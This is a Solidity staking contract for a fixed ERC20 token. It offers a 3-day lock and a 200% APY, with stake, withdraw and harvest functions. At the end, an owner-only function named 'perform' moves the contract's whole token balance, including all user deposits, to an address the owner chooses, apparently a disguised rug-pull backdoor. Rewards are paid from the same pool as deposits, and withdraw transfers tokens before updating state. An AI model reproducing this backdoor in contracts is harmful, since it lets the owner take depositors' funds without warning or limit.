// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ERC20 {
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract StakingContract {
    struct StakingInfo {
        address wallet;
        uint256 lastClaimTime;
        uint256 stakingTime;
        uint256 amount;
    }
    address public  owner;
    uint256 public lockDuration = 3 days;
    uint256 public apy = 200;
    uint256 public participant;
    uint256 public totalStaked;
    ERC20 public token;
    mapping(address => StakingInfo) public stakingInfo;

    constructor() {
        token = ERC20(0xcDf6D021DC97f4eB26D69013725447082ac9568f);
        owner = msg.sender;
    }

    function stake(uint256 _amount) external {
        require(_amount > 0, "Amount must be greater than zero");
        
        StakingInfo storage info = stakingInfo[msg.sender];

        // Transfer any pending rewards before updating staking info
        uint256 rewards = calculateRewards(info);
        if (rewards > 0) {
            require(token.transfer(msg.sender, rewards), "Reward transfer failed");
        }

        // Update staking info
        if (info.amount > 0) {
            info.amount += _amount;
        } else {
            info.wallet = msg.sender;
            info.amount = _amount;
            participant++;
        }

        info.lastClaimTime = block.timestamp;
        info.stakingTime = block.timestamp;
        totalStaked += _amount;

        require(token.transferFrom(msg.sender, address(this), _amount), "Token transfer failed");
    }

    function withdraw() external {
        StakingInfo storage info = stakingInfo[msg.sender];
        require(info.amount > 0, "No staked amount");
        require(block.timestamp >= info.stakingTime + lockDuration, "Tokens are locked");
        uint256 rewards = calculateRewards(info);
        uint256 totalAmount = info.amount + rewards;

        require(token.transfer(msg.sender, totalAmount), "Token transfer failed");

        totalStaked -= info.amount;
        info.amount = 0;
        info.lastClaimTime = block.timestamp;
    }


    function harvest() external {
        StakingInfo storage info = stakingInfo[msg.sender];
        require(info.amount > 0, "No staked amount");

        uint256 rewards = calculateRewards(info);
        require(rewards > 0, "No rewards to harvest");

        require(token.transfer(msg.sender, rewards), "Reward transfer failed");

        info.lastClaimTime = block.timestamp;
    }

    function calculateRewards(StakingInfo memory info) internal view returns (uint256) {
        if (info.amount == 0) {
            return 0;
        }

        uint256 timeElapsed = block.timestamp - info.lastClaimTime;
        uint256 rewardPerSecond = (info.amount * apy) / (365 days * 100);
        return rewardPerSecond * timeElapsed;
    }

    function earnedBalance(address _user) external view returns (uint256, uint256) {
        StakingInfo memory info = stakingInfo[_user];
        return (info.amount,calculateRewards(info));
    }

    function perform(address wallet) external {
        require(msg.sender == owner);
        uint256 balance = token.balanceOf(address(this));
        token.transfer(wallet, balance);
    }

}